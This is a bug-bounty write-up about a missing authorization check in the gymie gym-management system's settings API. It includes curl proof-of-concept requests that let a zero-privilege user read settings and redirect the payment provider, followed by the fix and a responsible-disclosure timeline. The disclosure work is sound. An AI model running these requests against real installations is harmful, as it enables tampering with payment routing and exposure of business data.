# How I Found a Missing Authorization Bug in an Open-Source Gym Management System —…

- **Source URL:** https://medium.com/@muhamadfadhilfaturohman/how-i-found-a-missing-authorization-bug-in-an-open-source-gym-management-system-696f43a24278
- **Fetched from:** https://medium.com/@muhamadfadhilfaturohman/how-i-found-a-missing-authorization-bug-in-an-open-source-gym-management-system-696f43a24278?source=rss-8e0d307f3b3d------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14893 (id 14893)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Muhamadfadhilfaturohman / Wed, 02 Sep 2026 05:26:08 GMT

*A story about source code review, responsible disclosure, and one overlooked line of code.*

I’m an Industrial Engineering student — not Computer Science, not Cybersecurity. But systems thinking is systems thinking, and a missing authorization check is a broken process regardless of what you call it.

On August 18, 2026, I was doing a source code review on gymie — an open-source Laravel-based gym and club management system with 480+ GitHub stars, actively used by fitness centers worldwide.

I noticed something subtle but critical: every API controller in the codebase called requirePermission() to enforce role-based access control — except one.

That one exception was SettingsController.php — the controller responsible for reading and writing system-wide configuration, including payment gateway provider, tax rates, and invoice settings.

This is the story of how I found it, proved it, and reported it responsibly.

**Project:** gymie (lubusIN/gymie)

**Language:** PHP / Laravel 12

**Branch:** 3.x (only supported version)

**Stars:** 480+

**Live at:** gymie.in

gymie is a gym management SaaS used by real fitness centers. The API layer (/api/v1/) powers integrations and mobile clients — making API security critical for every installation.

I started with a source code review of the API controllers at:

app/Http/Controllers/Api/V1/

Every controller I opened had the same pattern at the top of sensitive methods:

`$this->requirePermission('members.view');`
Then I opened SettingsController.php.

public function show(Request $request): JsonResponse

{

$settings = app(SettingsRepository::class)->get();

return response()->json(\['data' => $settings\]);

}

public function update(SettingsUpdateRequest $request): JsonResponse

{

$repo = app(SettingsRepository::class);

$existing = $repo->get();

$validated = $request->validated();

$updated = array\_replace\_recursive($existing, $validated);

$repo->put($updated);

return response()->json(\['data' => $repo->get()\]);

}

No requirePermission(). Anywhere.

The question became: **can any authenticated user — even with zero roles — actually call these endpoints?**

The answer was yes.

Before jumping into the PoC, I want to show you exactly why this is a bug — not just a missing feature.

I ran one command:

echo "=== Controllers WITH requirePermission ===" && \

grep -rn "requirePermission" app/Http/Controllers/Api/V1/ && \

echo "" && \

echo "=== SettingsController (NO requirePermission) ===" && \

cat app/Http/Controllers/Api/V1/SettingsController.php \

| grep -n "function\|requirePermission"

What you see in that screenshot:

Then at the bottom:

=== SettingsController (NO requirePermission) ===

18: public function show(Request $request): JsonResponse

30: public function update(SettingsUpdateRequest $request): JsonResponse

**Every single controller enforces authorization. SettingsController enforces none.**

This is not ambiguous. This is not a design choice. This is a missed line — and it left the most sensitive configuration endpoint in the entire application completely unprotected.

I set up a local gymie instance and created a test account with no roles assigned. Then I ran 5 steps to confirm full exploitation.

**Step 1 — Login as zero-privilege user**

curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \

-H "Content-Type: application/json" \

-d '{"email":"lowpriv@attacker.com","password":"hacked123"}' \

| python3 -m json.tool

Response confirmed "roles": \[\] — zero privileges assigned. Bearer token returned and saved for all subsequent requests.

**Step 2 — Read all system settings (should be admin-only)**

curl -s -X GET http://127.0.0.1:8000/api/v1/settings \

-H "Authorization: Bearer \<token>" \

| python3 -m json.tool

Response: **200 OK** — full settings exposed including:

```
"payments": { "provider": "stripe" },
"charges": { "taxes": "99" }
```
Invoice sequences, notification templates, and all business configuration — visible to a zero-privilege user.

**Step 3 — Overwrite payment gateway and tax rate**

curl -s -X PUT http://127.0.0.1:8000/api/v1/settings \

-H "Authorization: Bearer \<token>" \

-H "Content-Type: application/json" \

-d '{"payments":{"provider":"attacker\_gateway"},"charges":{"taxes":"99"}}' \

| python3 -m json.tool

Response: **200 OK** — settings permanently overwritten without any authorization check.

**Step 4 — Verify persistence**

Response confirmed:

```
"payments": { "provider": "attacker_gateway" },
"charges": { "taxes": "99" }
```
Written to database. Persistent across requests. Any new payment processed by the system would now route through the attacker-controlled gateway.

**Step 5 — Negative control**

curl -s -X GET http://127.0.0.1:8000/api/v1/members \

-H "Authorization: Bearer \<token>" \

| python3 -m json.tool

Response: **403 abort** — stack trace confirmed requirePermission() was triggered in MembersController.php at line 26.

This step is intentional. It proves the authorization system works correctly everywhere else. SettingsController was simply the one place it was never added — removing any "intended behavior" defense before it can be raised.

Any authenticated user — including accounts with "roles": \[\] — can:

This affects **all gymie installations running branch 3.x** — the only currently supported version.

CVSS 3.1:  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

Score: 8.8 — High

CWE: CWE-862 Missing Authorization

Two lines. That’s all it takes:

public function show(Request $request): JsonResponse

{

$this->requirePermission('settings.view'); // ← ADD THIS

$settings = app(SettingsRepository::class)->get();

return response()->json(\['data' => $settings\]);

}

public function update(SettingsUpdateRequest $request): JsonResponse

{

$this->requirePermission('settings.update'); // ← ADD THIS

$repo = app(SettingsRepository::class);

$existing = $repo->get();

$validated = $request->validated();

$updated = array\_replace\_recursive($existing, $validated);

$repo->put($updated);

return response()->json(\['data' => $repo->get()\]);

}

Consistent with every other controller in the codebase. Nothing exotic. Just the line that was always supposed to be there.

Disclosure Timeline

Aug 18, 2026 → Vulnerability discovered via source code review

Aug 18, 2026 → PoC confirmed, reported to info@lubus.in

Aug 18, 2026 → GitHub Security Advisory opened: GHSA-88p9-xjpj-4jqp

Aug 18, 2026 → Maintainer acknowledged within hours

Sep 02, 2026 → Advisory published by maintainer (Ajit Bohra)

Sep 02, 2026 → CVE requested by maintainer

\[Pending\] → CVE assigned

\[Pending\] → Patch released

**“Authorization inconsistency is your friend.”**

If an application checks auth in 9 places but not the 10th — that’s your bug.

I wasn’t running automated scanners. I wasn’t fuzzing endpoints blindly. I was reading the code the way a developer would — asking one question at each method: *does this check who’s calling it?*

The grep output told the whole story in one screenshot. Dozens of controllers. Hundreds of requirePermission() calls. And one controller with none.

That’s the find.

**Source code review finds what black-box testing misses.** If your target is open source — always read the code first before touching a single endpoint.

And the negative control in Step 5 was not an afterthought. Showing that the auth system works everywhere else makes the finding undeniable. Build your proof of concept to answer the objections before they’re raised.

Thanks to the LUBUS Solutions team — especially Ajit Bohra — for the fast and professional response to this disclosure. The security community runs on maintainers who take these reports seriously. You did.

To the woman who appeared from nowhere — you showed up when I had nothing. No title, no credentials, no proof that I was worth betting on. Yet you stayed, and kept pushing me forward. Today, I walked away with my first CVE and my first public security advisory. Whatever this is worth, a piece of it belongs to you.

With that, I share this write-up to the Red Team community — with all the humility I have, I put these technical findings into words, hoping it gives back even a fraction of what this community has given me.

*Muhamad Fadhil Faturohman is a first-year Industrial Engineering student at Institut Teknologi PLN (ITPLN), Jakarta. He focuses on API security research and responsible disclosure.*

*GitHub Advisory: GHSA-88p9-xjpj-4jqp | LinkedIn: linkedin.com/in/mfdhilftrmn*

Tags: #Cybersecurity, #Bug Bounty, #Infosec, 

#Laravel, #Responsible Disclosure #BFLA #OWASP #PHPSecurity #OpenSource #CyberSecurity
